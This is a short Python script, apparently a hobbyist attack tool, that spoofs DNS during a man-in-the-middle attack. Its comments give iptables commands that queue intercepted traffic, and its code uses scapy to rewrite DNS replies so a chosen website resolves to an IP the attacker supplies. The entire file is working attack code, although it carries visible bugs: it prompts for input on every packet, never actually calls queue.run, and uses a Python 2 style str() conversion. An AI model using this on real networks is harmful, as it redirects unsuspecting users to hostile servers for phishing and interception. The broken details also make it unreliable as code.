#Run this command in terminal for testing in local
#iptables -I INPUT -j NFQUEUE --queue-num 1
#iptables -I OUTPUT -j NFQUEUE --queue-num 1

# Run this command in terminal when running mitm to dns spoof
#iptables -I FORWARD -j NFQUEUE --queue-num 1

#Run iptables --flush to clear iptable rules

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
		scapy_packet=scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname=scapy_packet[scapy.DNSQR].qname
			target=input("Input target Website")
			spoof_ip=input("provide ip to redirect the website to: ")
			if target in qname:
				print("Spoofing target")
				answer=scapy.DNSRR(rrname=qname,rdata=spoof_ip)
				scapy_packet[scapy.DNS].an=answer
				scapy_packet[scapy.DNS].ancount=1

				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.UDP].len
				del scapy_packet[scapy.UDP].chksum

				packet.set_payload(str(scapy_packet))
		packet.accept()

queue=NetfilterQueue()
queue.bind(1,process_packet)
queue.run